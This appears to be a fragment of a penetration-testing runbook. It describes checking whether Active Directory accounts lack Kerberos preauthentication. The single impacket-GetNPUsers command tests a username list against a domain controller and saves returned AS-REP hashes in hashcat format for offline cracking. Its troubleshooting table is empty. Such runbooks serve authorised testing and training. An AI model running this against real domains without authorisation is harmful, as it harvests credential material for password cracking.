## Check preauthentication behavior for a bounded user list

**Run in:** Kali. **Requires:** A known realm, reachable KDC and candidate usernames; no supplied password is used in this example.

```bash
impacket-GetNPUsers 'DOMAIN_FQDN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
```

**What the result establishes:** A returned AS-REP artifact identifies an account for which the requested preauthentication condition applied.

**Next check:** Separate each response class; handle returned artifacts using their actual format and retain the associated account name.

## If it fails

| Symptom | Check |
| --- | --- |
